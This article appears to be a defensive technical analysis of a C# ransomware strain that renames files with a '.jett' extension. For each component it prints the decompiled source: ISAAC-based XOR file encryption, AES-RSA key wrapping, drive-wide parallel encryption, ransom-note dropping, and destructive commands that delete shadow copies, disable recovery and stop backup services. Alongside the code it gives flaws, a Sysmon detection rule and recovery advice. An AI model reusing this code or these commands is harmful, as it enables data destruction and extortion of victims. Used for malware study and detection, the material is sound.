# Technical Analysis of a C# Ransomware Encryption Codebase

## Introduction
This article provides a detailed technical analysis of a C# ransomware codebase, specifically the `Encryption` class, which implements file encryption, system sabotage, and persistence mechanisms. The code is malicious, designed to encrypt files, disable recovery options, and demand a ransom. This analysis is intended for cybersecurity researchers, incident responders, or defenders to understand ransomware behavior, detect it, or mitigate its impact. **Do not execute or modify this code, as it could cause significant harm.**

The `Encryption` class includes a custom ISAAC-based encryption algorithm, AES-RSA hybrid encryption, file encryption logic, and methods to disable system recovery and backup services. Below, we dissect key components, illustrate their purpose with code snippets, highlight flaws, and provide defensive strategies.

---

## 1. `Crypt.ISAAC` Class
**Purpose**: Implements the ISAAC (Indirection, Shift, Accumulate, Add, and Count) algorithm, a cryptographically secure pseudorandom number generator (CSPRNG) used for file encryption.

**Code**:
```csharp
public class ISAAC
{
    public const int SIZE = 512;
    public const int MASK = 2044;
    public int count;
    public int[] rsl;
    public int[] mem;
    private int a, b, c;

    public ISAAC()
    {
        mem = new int[512];
        rsl = new int[512];
        Init(flag: false);
    }

    public ISAAC(int[] seed)
    {
        mem = new int[512];
        rsl = new int[512];
        for (int i = 0; i < seed.Length; i++)
        {
            rsl[i] = seed[i];
        }
        Init(flag: true);
    }

    public void Isaac()
    {
        b += ++c;
        int num = 0;
        int num2 = 256;
        while (num < 256)
        {
            int num3 = mem[num];
            a ^= a << 13;
            a += mem[num2++];
            int num4 = (mem[num] = mem[(num3 & 0x7FC) >> 2] + a + b);
            rsl[num++] = (b = mem[((num4 >> 9) & 0x7FC) >> 2] + num3);
            // Similar operations repeated for bit shifts and memory updates
        }
        // Second loop for remaining 256 elements
    }

    public void Init(bool flag)
    {
        // Initializes internal state with mixing operations
        int num8 = num7 = num6 = num5 = num4 = num3 = num2 = num = -1640531527;
        for (int i = 0; i < 4; i++)
        {
            num8 ^= num7 << 11;
            num5 += num8;
            num7 += num6;
            // Additional bitwise and addition operations
        }
        // Incorporates seed if flag is true
        Isaac();
        count = 512;
    }

    public int val()
    {
        if (count-- == 0)
        {
            Isaac();
            count = 511;
        }
        return rsl[count];
    }
}
```

**Analysis**:
- **Structure**: ISAAC is a CSPRNG that generates a stream of pseudorandom numbers for XOR-based file encryption.
- **Initialization (`Init`)**: Sets up internal state (`mem` and `rsl` arrays) using a mixing function. If a seed is provided, it’s incorporated into the state.
- **Generation (`Isaac`)**: Produces 512 random integers by performing bitwise operations (shifts, XOR) and memory updates.
- **Output (`val`)**: Returns a single random integer, refreshing the state when exhausted.
- **Flaw**: The implementation is complex but appears to deviate from standard ISAAC (e.g., `MASK = 2044` is unusual). Incorrect implementation could weaken randomness, potentially allowing cryptanalysis.
- **Malicious Impact**: Generates a keystream for XOR encryption of files, making decryption without the key difficult.

**Defensive Strategy**:
- **Detection**: Monitor for unusual memory allocation patterns or high CPU usage indicative of custom encryption algorithms.
- **Mitigation**: Cryptanalysis of the ISAAC implementation may reveal weaknesses, but this requires expert analysis.

---

## 2. `Crypt.PrepareKey` Method
**Purpose**: Initializes the ISAAC CSPRNG with a key derived from a password and system information.

**Code**:
```csharp
public static ISAAC PrepareKey()
{
    try
    {
        string machineName = Environment.MachineName;
        byte[] bytes = Encoding.UTF8.GetBytes(password);
        ISAAC iSAAC = new ISAAC();
        for (int i = 0; i < 3; i++)
        {
            iSAAC.Isaac();
        }
        for (int j = 0; j < 512; j++)
        {
            iSAAC.mem[j] = bytes[j];
        }
        StringBuilder stringBuilder = new StringBuilder(machineName.Length);
        for (int k = 0; k < machineName.Length; k++)
        {
            stringBuilder.Append(' ');
        }
        machineName = stringBuilder.ToString();
        for (int l = 0; l < bytes.Length; l++)
        {
            bytes[l] = 0;
        }
        machineName = null;
        bytes = null;
        for (int m = 0; m < 3; m++)
        {
            iSAAC.Isaac();
        }
        return iSAAC;
    }
    catch (WebException)
    {
        return null;
    }
    catch
    {
        return null;
    }
}
```

**Analysis**:
- **Lines 3-4**: Retrieves the machine name and converts a static `password` to bytes.
- **Lines 5-8**: Initializes ISAAC and runs three iterations to mix the state.
- **Lines 9-11**: Overwrites the ISAAC memory with the password bytes (up to 512 bytes).
  - **Flaw**: If the password is shorter than 512 bytes, uninitialized memory remains, potentially weakening the key.
- **Lines 12-19**: Overwrites `machineName` with spaces and clears the `bytes` array, likely to prevent memory analysis.
  - **Flaw**: Overwriting `machineName` is redundant since it’s reassigned as null, and memory clearing may not prevent forensic recovery.
- **Lines 20-22**: Runs three more ISAAC iterations to finalize the key.
- **Flaw**: The `WebException` catch is irrelevant, suggesting copy-pasted or poorly designed error handling. Returning `null` on failure could crash the encryption process.

**Malicious Impact**:
- Creates a seeded ISAAC instance for file encryption, tying the key to the password and system context.

**Defensive Strategy**:
- **Detection**: Monitor access to `Environment.MachineName` or unusual memory manipulation.
- **Mitigation**: Forensic tools can recover the password from memory if not properly cleared.

---

## 3. `Crypt.CryptFile` Method
**Purpose**: Encrypts a file using the ISAAC CSPRNG and a subkey.

**Code**:
```csharp
public static void CryptFile(ISAAC csprng, byte[] subkey, string loc)
{
    FileStream fileStream = null;
    int[] array = null;
    try
    {
        fileStream = File.Open(loc, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
        array = new int[512];
        for (int i = 0; i < 512; i++)
        {
            array[i] = csprng.mem[i];
        }
        for (int j = 0; j < subkey.Length; j++)
        {
            csprng.mem[j] ^= subkey[j];
        }
        byte[] array2 = new byte[819200];
        int num = fileStream.Read(array2, 0, 819200);
        do
        {
            csprng.Isaac();
            for (int k = 0; k < num; k++)
            {
                array2[k] = (byte)(array2[k] ^ csprng.rsl[k % 512]);
            }
            fileStream.Seek(-num, SeekOrigin.Current);
            fileStream.Write(array2, 0, num);
        }
        while ((num = fileStream.Read(array2, 0, 819200)) > 0);
    }
    catch (UnauthorizedAccessException)
    {
    }
    finally
    {
        if (fileStream != null)
        {
            fileStream.Close();
            fileStream.Dispose();
        }
        if (array != null)
        {
            csprng.mem = array;
            csprng.Isaac();
        }
    }
}
```

**Analysis**:
- **Lines 6-8**: Opens the target file with exclusive access and saves the ISAAC memory state.
- **Lines 9-12**: XORs the ISAAC memory with the subkey to modify the encryption state.
- **Lines 13-21**: Reads the file in 819200-byte chunks, XORs each byte with the ISAAC keystream (`rsl`), and writes the encrypted data back.
  - **Why?** XOR encryption is fast and reversible with the same keystream.
- **Lines 22-28**: Handles cleanup, restoring the original ISAAC memory and running an additional `Isaac` iteration.
- **Flaw**: Silent handling of `UnauthorizedAccessException` means failed encryptions are ignored, potentially leaving files unencrypted.
- **Flaw**: The buffer size (819200 bytes) is arbitrary and may cause issues with large files or low memory.

**Malicious Impact**:
- Encrypts files in-place, making them inaccessible without the original ISAAC key.

**Defensive Strategy**:
- **Detection**: Monitor file write operations with large XOR patterns or unusual file access patterns.
- **Mitigation**: File versioning or backups can restore files if encryption is interrupted.

---

## 4. `EncryptLongString` and `RSA_Encrypt` Methods
**Purpose**: Encrypts strings (e.g., the encryption password) using AES with RSA-encrypted keys or direct RSA encryption.

**Code**:
```csharp
public static string EncryptLongString(string textToEncrypt, string publicKeyString)
{
    try
    {
        using Aes aes = Aes.Create();
        aes.KeySize = 256;
        aes.GenerateKey();
        aes.GenerateIV();
        byte[] array;
        using (MemoryStream memoryStream = new MemoryStream())
        {
            using (ICryptoTransform transform = aes.CreateEncryptor())
            {
                using CryptoStream stream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
                using StreamWriter streamWriter = new StreamWriter(stream);
                streamWriter.Write(textToEncrypt);
            }
            array = memoryStream.ToArray();
        }
        using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(4096);
        rSACryptoServiceProvider.FromXmlString(publicKeyString);
        byte[] array2 = rSACryptoServiceProvider.Encrypt(aes.Key, fOAEP: true);
        byte[] array3 = new byte[4 + array2.Length + 16 + array.Length];
        BitConverter.GetBytes(array2.Length).CopyTo(array3, 0);
        array2.CopyTo(array3, 4);
        aes.IV.CopyTo(array3, 4 + array2.Length);
        array.CopyTo(array3, 4 + array2.Length + 16);
        return Convert.ToBase64String(array3);
    }
    catch (Exception ex)
    {
        throw new Exception("خطا در رمزنگاری: " + ex.Message);
    }
}
```

**Analysis**:
- **Lines 3-15**: Encrypts the input string with AES-256, generating a random key and IV.
- **Lines 16-23**: Encrypts the AES key with a 4096-bit RSA public key and combines the RSA-encrypted key, AES IV, and ciphertext into a single Base64-encoded string.
- **Flaw**: The error message contains Persian text (“خطا در رمزنگاری”), which may reveal the attacker’s origin or locale.
- **Malicious Impact**: Used to encrypt the ISAAC password, storing it in `Key.bin` for potential attacker retrieval.

**Defensive Strategy**:
- **Detection**: Look for Base64-encoded files (`Key.bin`) with RSA and AES structures.
- **Mitigation**: If the RSA private key is available (e.g., from `private_key.xml`), decrypt the AES key to recover the ISAAC password.

---

## 5. `Encrypt` Method
**Purpose**: Encrypts individual files, adds ransom notes, and renames files with a custom extension.

**Code**:
```csharp
internal static void Encrypt(string name)
{
    try
    {
        string fileName = Path.GetFileName(name);
        string extension = Path.GetExtension(name);
        if (extension == ".jett") return;
        switch (fileName)
        {
            case "private_key.xml":
            case "Key.bin":
            case "info.hta":
                return;
        }
        string[] source = new string[8] { "BOOTNXT", "bootmgr", "BOOTSECT.BAK", "boot.sdi", "ReAgent.xml", "Winre.wim", "BOOTSTAT.DAT", "bootx64.efi" };
        if (extension == ".BCD.LOG1" || extension == ".BCD.LOG2" || source.Contains(fileName)) return;
        Console.WriteLine(name);
        string? directoryName = Path.GetDirectoryName(name);
        string path = Path.Combine(directoryName, "ReadMe.txt");
        string path2 = Path.Combine(directoryName, "info.hta");
        if (!File.Exists(path))
        {
            File.WriteAllText(path, config.Readme_Text.Replace("_pcid_", config.GetID()).Replace("_em1_", config.Email_1).Replace("_em2_", config.Email_2));
        }
        if (!File.Exists(path2))
        {
            File.WriteAllText(path2, Resources.info.Replace("_email2_", config.Email_2).Replace("_email1_", config.Email_1).Replace("_id_", config.GetID()));
        }
        Crypt.PrepareKey();
        Crypt.CryptFile(new Crypt.ISAAC(), KeyEncrypt(Crypt.password), name);
        File.Move(name, name + ".[" + ServerConnection.GetID() + "][" + config.Email_1 + "].jett");
    }
    catch (Exception ex)
    {
        LogError(ex.Message);
    }
}
```

**Analysis**:
- **Lines 5-15**: Skips files with the `.jett` extension, specific files (`private_key.xml`, `Key.bin`, `info.hta`), or critical system files (e.g., `bootmgr`).
- **Lines 16-23**: Creates `ReadMe.txt` and `info.hta` in the file’s directory with ransom note content, including the victim’s ID and attacker’s emails.
- **Lines 24-25**: Encrypts the file using ISAAC with a key derived from the password.
- **Line 26**: Renames the encrypted file with a `.jett` extension, embedding the victim’s ID and attacker’s email.
- **Flaw**: Excludes `private_key.xml`, which, if present from `ServerConnection.GenerateAndSaveRSAKeys`, allows decryption of the AES key in `Key.bin`.

**Malicious Impact**:
- Encrypts files and leaves ransom notes, making data inaccessible and directing victims to contact the attacker.

**Defensive Strategy**:
- **Detection**: Monitor file renames with `.jett` extensions or creation of `ReadMe.txt` and `info.hta`.
- **Recovery**: Use `private_key.xml` to decrypt `Key.bin` and recover the ISAAC password.

---

## 6. `StartEncryption` Method
**Purpose**: Orchestrates encryption across all drives using parallel processing.

**Code**:
```csharp
public static void StartEncryption()
{
    try
    {
        ParallelOptions parallelOptions = new ParallelOptions
        {
            MaxDegreeOfParallelism = Environment.ProcessorCount
        };
        List<DriveInfo> list = (from x in DriveInfo.GetDrives()
            where x.IsReady
            select x).ToList();
        List<Thread> list2 = new List<Thread>();
        foreach (DriveInfo drive in list)
        {
            Thread thread = new Thread((ThreadStart)delegate
            {
                try
                {
                    Parallel.ForEach(Directory.GetFiles(drive.Name, "*.*", SearchOption.TopDirectoryOnly), parallelOptions, delegate(string file)
                    {
                        Encrypt(file);
                    });
                    Parallel.ForEach((from dir in Directory.GetDirectories(drive.Name)
                        where NecessaryToEncrypt(dir)
                        select dir).ToList(), parallelOptions, delegate(string directory)
                    {
                        SearchDirectory(directory);
                    });
                }
                catch
                {
                }
            });
            list2.Add(thread);
            thread.Start();
        }
        foreach (Thread item in list2)
        {
            item.Join();
        }
    }
    catch
    {
    }
}
```

**Analysis**:
- **Lines 4-6**: Configures parallel processing to use all CPU cores.
- **Lines 7-9**: Identifies all ready drives.
- **Lines 10-24**: Spawns a thread per drive, encrypting files in the root directory and recursively processing subdirectories (via `SearchDirectory`) if `NecessaryToEncrypt` allows.
- **Flaw**: Silent error handling may skip drives or directories, leaving some files unencrypted.
- **Malicious Impact**: Rapidly encrypts files across all drives, maximizing damage.

**Defensive Strategy**:
- **Detection**: Monitor high CPU usage or parallel file access across drives.
- **Prevention**: Use file system monitoring to block unauthorized writes.

---

## 7. System Sabotage Methods
**Purpose**: Disables recovery and monitoring mechanisms to prevent data restoration or detection.

**Code**:
```csharp
private static void deleteShadowCopies()
{
    runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
}

private static void disableRecoveryMode()
{
    runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
}

private static void deleteBackupCatalog()
{
    runCommand("wbadmin delete catalog -quiet");
}

public static void DisableTaskManager()
{
    try
    {
        RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
        registryKey.SetValue("DisableTaskMgr", "1");
        registryKey.Close();
    }
    catch
    {
    }
}

private static void stopBackupServices()
{
    string[] array = new string[42] { "BackupExecAgentBrowser", "vss", "sql", "veeam", /* ... */ };
    foreach (string text in array)
    {
        try
        {
            new ServiceController(text).Stop();
        }
        catch
        {
        }
    }
}
```

**Analysis**:
- **deleteShadowCopies**: Deletes Volume Shadow Copies, preventing restoration of previous file versions.
- **disableRecoveryMode**: Disables Windows recovery options, making system repair harder.
- **deleteBackupCatalog**: Removes Windows Backup catalogs, eliminating backup recovery.
- **DisableTaskManager**: Disables Task Manager to prevent users from terminating the ransomware.
- **stopBackupServices**: Stops 42 backup and security services (e.g., Veeam, Sophos) to evade detection and backups.
- **Flaw**: Silent error handling means failures (e.g., insufficient permissions) are ignored, potentially leaving recovery options intact.

**Malicious Impact**:
- Severely hampers recovery, forcing victims to rely on the attacker for decryption.

**Defensive Strategy**:
- **Detection**: Monitor `cmd.exe` executions with `vssadmin`, `bcdedit`, or `wbadmin`, and registry changes to `DisableTaskMgr`.
- **Prevention**: Restrict command execution and service stops via Group Policy or security software.
- **Mitigation**: Maintain offline backups to restore data.

---

## 8. `Main` Method
**Purpose**: Orchestrates the ransomware’s execution.

**Code**:
```csharp
private static void Main(string[] args)
{
    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
    try
    {
        ServerConnection.RequireAdministratorAccess();
        DisableTaskManager();
        deleteShadowCopies();
        disableRecoveryMode();
        deleteBackupCatalog();
        stopBackupServices();
        if (!File.Exists("public_key.xml"))
        {
            ServerConnection.GenerateAndSaveRSAKeys();
        }
        Crypt.password = UltraSecureKeyGenerator.CreatePassword(4094);
        Crypt.passwordRsa = EncryptLongString(Crypt.password, rsaKey());
        File.WriteAllText("C:Key.bin", Crypt.passwordRsa);
        File.WriteAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Key.bin"), Crypt.passwordRsa);
        ServerConnection.StartUPAdd();
        StartEncryption();
        string fileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "info.hta");
        for (int i = 0; i < 3; i++)
        {
            Process.Start(fileName);
            Thread.Sleep(500);
        }
    }
    catch
    {
    }
}
```

**Analysis**:
- **Line 3**: Enforces TLS 1.2 (likely for network communication, though none is evident here).
- **Lines 5-9**: Ensures admin privileges, disables Task Manager, and removes recovery options.
- **Lines 10-12**: Generates RSA keys if `public_key.xml` is missing.
- **Lines 13-16**: Generates a 4094-character password, encrypts it with AES-RSA, and saves it as `Key.bin` on the C: drive and Desktop.
- **Lines 17-18**: Adds persistence via `info.hta` and starts encryption.
- **Lines 19-23**: Launches `info.hta` multiple times to display the ransom note.
- **Critical Flaw**: Storing `private_key.xml` (from `ServerConnection.GenerateAndSaveRSAKeys`) allows decryption of `Key.bin`, revealing the ISAAC password and enabling file recovery.

**Malicious Impact**:
- Executes a full ransomware attack, encrypting files, disabling recovery, and displaying a ransom note.

**Defensive Strategy**:
- **Detection**: Monitor creation of `Key.bin` or repeated `info.hta` launches.
- **Recovery**: Use `private_key.xml` to decrypt `Key.bin` and recover files.

---

## Overall Malicious Workflow
1. **Initialization**: Gains admin privileges, disables Task Manager, and removes recovery options.
2. **Key Setup**: Generates RSA keys, creates an ISAAC password, and encrypts it with AES-RSA, saving it as `Key.bin`.
3. **Persistence**: Adds `info.hta` to the Startup folder and launches it to display a ransom note.
4. **Encryption**: Encrypts files across all drives using ISAAC, adds ransom notes, and renames files with `.jett`.
5. **Outcome**: Files are encrypted, recovery is disabled, and the victim is directed to contact the attacker.

**Critical Flaw**: Local storage of `private_key.xml` allows decryption of `Key.bin`, enabling recovery without payment.

---

## Defensive Strategies
### Detection
- **Sysmon Rule Example**:
  ```xml
  <RuleGroup name="Ransomware" groupRelation="or">
    <FileCreate onmatch="include">
      <TargetFilename condition="end with">.jett</TargetFilename>
      <TargetFilename condition="end with">Key.bin</TargetFilename>
      <TargetFilename condition="end with">ReadMe.txt</TargetFilename>
      <TargetFilename condition="end with">info.hta</TargetFilename>
    </FileCreate>
    <ProcessCreate onmatch="include">
      <Image condition="contains">cmd.exe</Image>
      <CommandLine condition="contains">vssadmin</CommandLine>
      <CommandLine condition="contains">bcdedit</CommandLine>
      <CommandLine condition="contains">wbadmin</CommandLine>
    </ProcessCreate>
    <RegistryEvent onmatch="include">
      <TargetObject condition="contains">DisableTaskMgr</TargetObject>
    </RegistryEvent>
  </RuleGroup>
  ```
- Monitor file renames, command executions, and registry changes.

### Prevention
- Disable HTA execution via Group Policy.
- Restrict `cmd.exe` and service modifications.
- Use standard user accounts to limit privilege escalation.
- Deploy EDR to block suspicious file operations.

### Mitigation
- Search for `private_key.xml` to decrypt `Key.bin` and recover the ISAAC password.
- Restore from offline backups.
- Engage incident response professionals for active infections.

---

## Conclusion
This ransomware’s `Encryption` class demonstrates sophisticated malicious behavior, combining ISAAC-based file encryption, AES-RSA hybrid encryption, and system sabotage. However, the local storage of `private_key.xml` is a critical flaw, enabling potential recovery without payment. Defenders can leverage this flaw, monitor for signatures (e.g., `.jett` files, `Key.bin`), and implement robust prevention measures to mitigate its impact.

For further analysis or incident response, consult cybersecurity experts. If facing an active infection, contact law enforcement or professionals immediately.

**Disclaimer**: This analysis is for educational and defensive purposes only. Do not use this code for malicious purposes, as it is illegal and harmful.

---